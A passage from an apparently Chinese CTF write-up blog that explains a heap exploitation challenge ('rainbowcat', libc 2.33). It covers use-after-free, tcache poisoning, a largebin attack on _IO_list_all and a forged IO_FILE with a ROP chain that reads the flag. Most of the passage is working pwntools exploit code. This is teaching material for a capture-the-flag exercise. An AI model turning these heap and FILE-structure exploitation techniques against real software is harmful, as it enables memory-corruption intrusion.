<p>可见最多只能有三个堆指针，固定申请大小为0x10，而且最主要的问题在于申请得到的堆指针会跟<code>qword_203168</code>进行比较，<code>qword_203168</code>在程序开始的时候被赋值成了堆基址，也就是说程序会借此判断malloc返回的指针是否在堆上，如果不在则直接exit()</p>
<p>此外delete有UAF，show固定输出十个字节，且最多用两次edit固定写十个字节</p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>show函数的限制其实无所谓，一次泄漏heap，一次泄漏libc。因为拿不到程序基址所以add中申请chunk位置的限制应该是无法绕过的，这也就意味着这题应该是打IO_FILE的思路。</p>
<p>因为UAF以及edit的存在，就相当于有0x10字节的任意地址写（当然因为add的限制所以其实是任意堆地址写），而add、edit、delete都没有次数限制，也就意味着可以写无限字节。</p>
<p>因为堆指针有限而且为了方便，可以让一个堆指针指向tcache-&gt;counts，再让一个堆指针指向0x20大小的tcache-&gt;entry，这样就可以编辑任意堆地址了。如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x50</span>):</span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">L = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = L &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)	<span class="comment">#double free</span></span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x10</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)	<span class="comment"># 1 point to tcache counts</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x90</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>) <span class="comment"># 2 point to tcache entry</span></span><br></pre></td></tr></table></figure>

<p>然后为了要largebin_attack，构造两个largebin chunk以及一个smallbin chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#make 0xa1 0x441 0x461 chunk</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">5</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x290</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))	<span class="comment">#0x290 =&gt; 0x441</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x6f0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x461</span>))	<span class="comment">#0x6f0 =&gt; 0x461</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb70</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>))	<span class="comment">#0xb70 =&gt; 0xa1</span></span><br></pre></td></tr></table></figure>

<p>然后就是泄漏libc以及largebin_attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x700</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7fb5c00</span> - <span class="number">0x00007ffff7dd5000</span>)</span><br><span class="line">IO_list = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb80</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)	<span class="comment">#0x461 into largebin</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x710</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(IO_list-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>)<span class="comment">#hijack IO_list_all</span></span><br></pre></td></tr></table></figure>

<p>伪造的IO_FILE结构如下，选择用gadget+栈迁移的方式完成的orw，所以这个IO_FILE结构应该早很多libc版本都可以套用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">‘’‘</span><br><span class="line"><span class="number">0x000000000014d09a</span>: mov rbp, qword ptr [rdi + <span class="number">0x48</span>]; </span><br><span class="line">		    mov rax, qword ptr [rbp + <span class="number">0x18</span>]; </span><br><span class="line">		    lea r13, [rbp + <span class="number">0x10</span>]; </span><br><span class="line">		    mov dword ptr [rbp + <span class="number">0x10</span>], <span class="number">0</span>; </span><br><span class="line">		    mov rdi, r13; </span><br><span class="line">		    call qword ptr [rax + <span class="number">0x28</span>]; </span><br><span class="line">’‘’</span><br><span class="line">heap = heap_base</span><br><span class="line">gadget = libc_base + <span class="number">0x000000000014d09a</span></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">close = libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x26699</span></span><br><span class="line">syscall = libc_base + <span class="number">0x6105a</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x44c70</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x112a51</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005525c</span></span><br><span class="line">pop3 = libc_base + <span class="number">0xfc103</span></span><br><span class="line"></span><br><span class="line">fp = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x48</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span>) <span class="comment">#rbp</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x40</span> + <span class="number">0x18</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_wide_data-&gt;write_ptr &gt; _wide_data-&gt;write_base</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0x40</span>) <span class="comment">#_wide_data =&gt; A</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode &gt; 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x120</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0xc0</span>) <span class="comment"># B</span></span><br><span class="line">fake_IO_FILE += p64(gadget)</span><br><span class="line"><span class="comment"># &lt;= rbp point to</span></span><br><span class="line">fake_IO_FILE += p64(leave_ret) + p64(pop3) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ret)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(fp + <span class="number">0x218</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./rainbowcat&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.33.so&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x50</span>):</span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">L = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = L &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)	<span class="comment">#double free</span></span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x10</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)	<span class="comment"># 1 point to tcache counts</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64((heap_base+<span class="number">0x90</span>)^L))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>) <span class="comment"># 2 point to tcache entry</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#make 0xa1 0x441 0x461 chunk</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">5</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x290</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))	<span class="comment">#0x290 =&gt; 0x441</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x6f0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x461</span>))	<span class="comment">#0x6f0 =&gt; 0x461</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb70</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>))	<span class="comment">#0xb70 =&gt; 0xa1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x700</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7fb5c00</span> - <span class="number">0x00007ffff7dd5000</span>)</span><br><span class="line">IO_list = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0xb80</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)	<span class="comment">#0x461 into largebin</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x710</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(IO_list-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0</span>)<span class="comment">#hijack</span></span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000016a1fa: mov rbp, qword ptr [rdi + 0x48]; </span></span><br><span class="line"><span class="string">		    mov rax, qword ptr [rbp + 0x18]; </span></span><br><span class="line"><span class="string">		    lea r13, [rbp + 0x10]; </span></span><br><span class="line"><span class="string">		    mov dword ptr [rbp + 0x10], 0; </span></span><br><span class="line"><span class="string">		    mov rdi, r13; </span></span><br><span class="line"><span class="string">		    call qword ptr [rax + 0x28]; </span></span><br><span class="line"><span class="string">		    </span></span><br><span class="line"><span class="string">0x00000000001675b0: mov rdx, qword ptr [rdi + 8]; </span></span><br><span class="line"><span class="string">		    mov qword ptr [rsp], rax; </span></span><br><span class="line"><span class="string">		    call qword ptr [rdx + 0x20]; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">heap = heap_base</span><br><span class="line">gadget = libc_base + <span class="number">0x000000000014d09a</span></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">close = libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x26699</span></span><br><span class="line">syscall = libc_base + <span class="number">0x6105a</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x44c70</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x112a51</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005525c</span></span><br><span class="line">pop3 = libc_base + <span class="number">0xfc103</span></span><br><span class="line"></span><br><span class="line">fp = heap_base + <span class="number">0x290</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x48</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span>) <span class="comment">#rbp</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x40</span> + <span class="number">0x18</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#_wide_data-&gt;write_ptr &gt; _wide_data-&gt;write_base</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0x40</span>) <span class="comment">#_wide_data =&gt; A</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode &gt; 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x120</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp+<span class="number">0xc0</span>) <span class="comment"># B</span></span><br><span class="line">fake_IO_FILE += p64(gadget)</span><br><span class="line"><span class="comment"># &lt;= rbp point to</span></span><br><span class="line">fake_IO_FILE += p64(leave_ret) + p64(pop3) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ret)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(fp + <span class="number">0x218</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx_r12) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"><span class="comment">###########################</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(fake_IO_FILE),<span class="number">0x10</span>):</span><br><span class="line">	edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x2a0</span>+i))</span><br><span class="line">	edit(<span class="number">1</span>,p64(<span class="number">1</span>))</span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">0</span>,fake_IO_FILE[i:i+<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#abort b _IO_flush_all_lockp</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x7ffff7fb8e20</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/28/2022ciscn%E5%8D%8E%E5%8C%97%E5%8D%8A%E5%86%B3-tonote/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/28/2022ciscn%E5%8D%8E%E5%8C%97%E5%8D%8A%E5%86%B3-tonote/" class="post-title-link" itemprop="url">2022ciscn华北半决-tonote</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
